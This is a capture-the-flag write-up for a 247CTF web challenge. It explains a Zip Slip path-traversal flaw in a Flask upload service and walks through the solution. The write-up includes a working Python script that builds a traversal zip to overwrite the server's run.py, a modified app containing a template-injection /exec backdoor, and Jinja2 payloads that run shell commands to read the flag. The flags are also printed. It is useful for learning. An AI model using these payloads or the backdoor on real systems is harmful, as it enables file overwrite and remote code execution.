# Web: Slippery Upload

## Previous Flag
```
247CTF{b8d4dce713400424bc2ab7fa673f231c}
```

## Goal
Can you abuse the zip upload and extraction service to gain code execution on the server?

## What I learned
```
https://duckduckgo.com/?origin=funnel_home_bing&t=h_&q=zip+vulnerability%E2%80%9D&ia=web
Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z

Zip Slip is a form of directory traversal that can be exploited by extracting files from an archive. The premise of the directory traversal vulnerability is that an attacker can gain access to parts of the file system outside of the target folder in which they should reside. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution.

Normally uploaded zip file will be extracted to /tmp/uploads, unless zip file’s name is "../../evil.sh"
    evil.sh will be extracted to '/' directory (as we move up 2 level)

RCE stands for Remote Code Execution
    Security vulnerability that allows an attacker to run arbitrary code on a remote server or system without authorization

Note: The website itself is the run.py in "/app"

Server Side Template Injection(payload) with Jinja2 to gain RCE
https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/
```

## Solution
```
START CHALLENGE

https://6bf4d0741bb9c294.247ctf.com/

from flask import Flask, request
import zipfile, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = '/tmp/uploads/' 👀 trying bypass and traverse elsewhere

@app.route('/')
def source():
    return '
%s
' % open('/app/run.py').read() 👀 source code

def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f: 👀 Zip Slip vulnerability
                f.write(z.open(i.filename, 'r').read())

@app.route('/zip_upload', methods=['POST']) 👀 route only accept POST not GET
def zip_upload():                           # fx to post/upload zip file
    # perform check on upload filename and content-type before uploading to server & extracting using zip_extract()
    try:
        if request.files and 'zarchive' in request.files:
            zarchive = request.files['zarchive']
            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
                zarchive.save(zpath)
                zip_extract(zpath)
                return 'Zip archive uploaded and extracted!'
        return 'Only valid zip archives are acepted!'
    except:
         return 'Error occured during the zip upload process!'

if __name__ == '__main__':
    app.run()

# Creating the exploit zip file
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
#!/usr/bin/python3

from zipfile import ZipFile
import zipfile
import base64

def test():
    print("Creating ZipFile...")

    # Create a ZipInfo object with a filename that includes directory traversal
    # "../../app/test.txt" means when extracted, the file will be placed two directories up
    # from the extraction folder, then into 'app/test.txt'
    z_info = zipfile.ZipInfo(r"../../app/test.txt") 👀

    # Create a new zip file at the specified path in write mode
    z_file = ZipFile("./slip.zip", mode="w")

    # Write a file into the zip archive using the ZipInfo object as the filename
    # The file contents will be the string "Test"
    z_file.writestr(z_info, r"Test")

    # Close the zip file to save changes
    z_file.close()

    print("\nZipFile created!")

test()

AsianHacker-picoctf@webshell:~$ ./pythonScript.py ⌨️
Creating ZipFile...

ZipFile created!

AsianHacker-picoctf@webshell:~$ ls ⌨️
README.txt  pythonScript.py  slip.zip
AsianHacker-picoctf@webshell:~$ sz slip.zip ⌨️ 

# Note: Location when open is slip.zip > .. > .. > app

# Upload slip.zip to website using curl
AsianHacker-picoctf@webshell:~$ curl -X POST -F zarchive=@slip.zip -k https://e434f786c063489b.247ctf.com/zip_upload ⌨️
Zip archive uploaded and extracted!

# Modify pythonScript.py to redirect to run.py instead
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
#!/usr/bin/python3

from zipfile import ZipFile
import zipfile
import base64

def test():
    print("Creating ZipFile...")

    # modify test.txt to run.py
    z_info = zipfile.ZipInfo(r"../../app/run.py")
    z_file = ZipFile("./slip.zip", mode="w")
    z_file.writestr(z_info, r"Test")
    z_file.close()
    print("\nZipFile created!")

test()

AsianHacker-picoctf@webshell:~$ ./pythonScript.py ⌨️
Creating ZipFile...

ZipFile created!

AsianHacker-picoctf@webshell:~$ curl -X POST -F zarchive=@slip.zip -k https://e434f786c063489b.247ctf.com/zip_upload ⌨️
Zip archive uploaded and extracted

# Reload Browser: https://e434f786c063489b.247ctf.com/, means /app/run.py got overridded
Internal Server Error

# Note: Have to stop and start challenge again to reset it since run.py only contains TEST
New: https://05544a38a5326934.247ctf.com/

Method 1:
# Modify the run.py to have exec method
AsianHacker-picoctf@webshell:~$ vi src_new.py ⌨️
AsianHacker-picoctf@webshell:~$ cat src_new.py ⌨️
from flask import Flask, request, render_template_string        # add render_template_string 👀
import zipfile, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'

@app.route('/')
def source():
    return '%s' % open('/app/run.py').read()                    # Had fix this line mulitline got error 👀

def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                f.write(z.open(i.filename, 'r').read())

# SLIP_ZIP EXPLOIT: added this path exec 👀
@app.route("/exec")
def runcmd():
    try:
        return render_template_string(request.args.get("cmd"))
    except Exception:
        return "Exception Occured!"

@app.route('/zip_upload', methods=['POST'])
def zip_upload():
    try:
        if request.files and 'zarchive' in request.files:
            zarchive = request.files['zarchive']
            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
                zarchive.save(zpath)
                zip_extract(zpath)
                return 'Zip archive uploaded and extracted!'
        return 'Only valid zip archives are acepted!'
    except:
         return 'Error occured during the zip upload process!'

if __name__ == '__main__':
    app.run()

# Modify pythonScript.py
AsianHacker-picoctf@webshell:~$ vi pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
#!/usr/bin/python3

from zipfile import ZipFile
import zipfile
import base64

def testExploit():
    print("Creating ZipFile...")

    z_info = zipfile.ZipInfo(r"../../app/run.py")
    z_file = ZipFile("./slip.zip", mode="w")
    # z_file.writestr(z_info, r"Test")

    a = open("./src_new.py", "r")
    data = a.read()
    encoded = base64.b64encode(data.encode())

    z_file.writestr(z_info, base64.b64decode(encoded))
    z_file.close()
    a.close()
    print("\nZipFile created!")

testExploit()

# Create new malicous zip file and upload to new server
AsianHacker-picoctf@webshell:~$ ./pythonScript.py ⌨️⭐
Creating ZipFile...

ZipFile created!
AsianHacker-picoctf@webshell:~$ curl -X POST -F zarchive=@slip.zip -k https://05544a38a5326934.247ctf.com/zip_upload ⌨️⭐
Zip archive uploaded and extracted!

Browser: https://05544a38a5326934.247ctf.com/exec ⌨️
Exception Occured!

Browser: https://05544a38a5326934.247ctf.com/exec?cmd={{7*7}} ⌨️
49

Browser: https://05544a38a5326934.247ctf.com/exec?cmd=%7B%7Brequest.application.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()%7D%7D ⌨️
uid=100(nginx) gid=101(nginx) groups=82(www-data),101(nginx),101(nginx)

Browser: https://05544a38a5326934.247ctf.com/exec?cmd=%7B%7Brequest.application.__globals__.__builtins__.__import__(%27os%27).popen(%27ls%27).read()%7D%7D ⌨️
flag_33cd0604f65815a9375e2da04e1b8610.txt run.py

Browser: https://05544a38a5326934.247ctf.com/exec?cmd=%7B%7Brequest.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag_33cd0604f65815a9375e2da04e1b8610.txt%27).read()%7D%7D ⌨️
247CTF{33cd0604f65815a9375e2da04e1b8610} 🔐
```

## Flag
247CTF{33cd0604f65815a9375e2da04e1b8610}

## Continue
[Continue](../247ctf/WebAdministrativeOrm.md)